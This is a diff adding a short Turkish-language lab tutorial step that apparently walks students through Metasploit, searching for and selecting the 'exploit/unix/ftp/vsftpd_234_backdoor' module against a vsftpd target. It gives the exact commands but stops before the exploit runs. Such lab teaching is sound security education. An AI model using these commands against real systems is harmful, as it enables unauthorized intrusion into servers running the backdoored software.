@@ -1,0 +1,13 @@
+STEP 3 
+elimizdeki "silah deposundan" hedefimize uygun olan doğru "mermiyi" seçme aşamasıdır.
+Zafiyeti Arama (Search)
+Komut: search vsftpd
+Metasploit binlerce saldırı modülü içerir. Bizim hedefimiz olan vsftpd yazılımı için uygun olanı bulmalıyız.
+Ne Olacak? Ekranda bir tablo listelenecek. Bu tabloda exploit/unix/ftp/vsftpd_234_backdoor ismini görülmeli. Bu modül, tam olarak LAB 3'te hedeflediğimiz "Backdoor" zafiyetini kullanır.
+
+Modülü Seçme ve Kullanma (Use)
+Arama sonucunda bulduğumuz bu özel saldırı aracını aktif hale getirmeliyiz.
+Komut: use exploit/unix/ftp/vsftpd_234_backdoor
+
+Komutu yazdıktan sonra alt satırda yazıların rengi değişir.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > (Buradaki yazı kırmızı renktedir)
